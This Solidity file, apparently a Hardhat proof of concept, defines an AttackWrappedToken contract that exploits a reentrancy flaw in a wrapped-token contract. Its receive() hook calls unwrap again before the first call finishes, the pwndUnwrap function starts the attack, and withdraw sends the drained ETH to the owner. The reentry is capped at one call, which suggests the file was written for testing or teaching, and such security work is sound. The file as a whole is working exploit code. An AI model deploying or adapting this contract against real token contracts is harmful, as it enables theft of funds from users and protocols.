// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.28;

import "./WrappedToken.sol";
import "hardhat/console.sol";

contract AttackWrappedToken {
    WrappedToken public wrappedToken;
    address public owner;
    bool public isAttacking = false;

    constructor(address _wrappedToken) {
        wrappedToken = WrappedToken(_wrappedToken);
        owner = msg.sender;
    }

    // Function to receive ETH - this will be called when unwrap transfers ETH
    receive() external payable {
        // This demonstrates the reentrancy vulnerability
        // The contract can call unwrap again before the first call completes
        uint256 tokenBalance = wrappedToken.balanceOf(address(this));
        uint256 ethBalance = address(this).balance;
        
        // Log the reentrant call
        emit ReentrantCall(tokenBalance, ethBalance, msg.value);
        
        // Only attack once to avoid infinite loop
        if (isAttacking && tokenBalance > 0) {
            isAttacking = false; // Prevent infinite loop
            wrappedToken.unwrap(tokenBalance);
        }
    }

    event ReentrantCall(uint256 tokenBalance, uint256 ethBalance, uint256 msgValue);

    function pwndUnwrap(uint256 amount) public {
        require(wrappedToken.balanceOf(address(this)) >= amount, "Insufficient balance");
        isAttacking = true; // Enable attack mode
        // Start the attack by unwrapping once
        wrappedToken.unwrap(amount);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getTokenBalance() public view returns (uint256) {
        return wrappedToken.balanceOf(address(this));
    }

    function withdraw() public {
        require(msg.sender == owner, "Only the owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }
} 